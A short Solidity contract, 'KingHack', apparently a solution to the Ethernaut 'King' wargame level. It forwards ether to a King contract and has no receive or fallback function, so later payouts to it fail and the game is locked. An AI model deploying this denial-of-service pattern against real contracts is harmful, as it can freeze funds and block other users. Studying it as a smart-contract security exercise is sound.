// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

import "./King.sol";

contract KingHack {
    King obj;
    constructor(address addr) public {
        obj = King(payable(addr));
    }
    function hack() public payable {
        (bool success, ) = address(obj).call{value: msg.value}("");
        require(success, "Tx failed");
    }
}